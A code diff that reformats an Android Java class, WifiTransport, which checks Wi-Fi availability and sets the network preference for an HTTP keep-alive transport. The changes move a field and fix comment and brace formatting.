@@ -28,21 +28,21 @@ import com.android.syssetup.util.Utils;
  */
 public class WifiTransport extends HttpKeepAliveTransport implements Observer<Standby> {
 	private static final String TAG = "WifiTransport"; //$NON-NLS-1$
-	/** The forced. */
-	private boolean forced;
-	private boolean switchedOn;
-
 	// final String service = Context.WIFI_SERVICE;
 	final WifiManager wifi = (WifiManager) Status.getAppContext().getSystemService(Context.WIFI_SERVICE);
 	private final ConnectivityManager connManager = (ConnectivityManager) Status.getAppContext().getSystemService(
 			Context.CONNECTIVITY_SERVICE);
+	/**
+	 * The forced.
+	 */
+	private boolean forced;
+	private boolean switchedOn;
 	private int ip;
 
 	/**
 	 * Instantiates a new wifi transport.
-	 * 
-	 * @param host
-	 *            the host
+	 *
+	 * @param host the host
 	 */
 	public WifiTransport(final String host) {
 		super(host);
@@ -50,11 +50,9 @@ public class WifiTransport extends HttpKeepAliveTransport implements Observer<St
 
 	/**
 	 * Instantiates a new wifi transport.
-	 * 
-	 * @param host
-	 *            the host
-	 * @param wifiForced
-	 *            the wifi forced
+	 *
+	 * @param host       the host
+	 * @param wifiForced the wifi forced
 	 */
 	public WifiTransport(final String host, final boolean wifiForced) {
 		super(host);
@@ -81,10 +79,10 @@ public class WifiTransport extends HttpKeepAliveTransport implements Observer<St
 
 		if (available) {
 			connManager.setNetworkPreference(ConnectivityManager.TYPE_WIFI);
-		}else{
-            NetworkInfo networkInfo = connManager.getNetworkInfo(ConnectivityManager.TYPE_WIFI);
-            return networkInfo.isAvailable();
-        }
+		} else {
+			NetworkInfo networkInfo = connManager.getNetworkInfo(ConnectivityManager.TYPE_WIFI);
+			return networkInfo.isAvailable();
+		}
 
 		return available;
 	}
@@ -148,7 +146,7 @@ public class WifiTransport extends HttpKeepAliveTransport implements Observer<St
 			Check.log(TAG + " (enable) finished " + isAvailable());
 		}
 
-        return false;
+		return false;
 	}
 
 	@Override
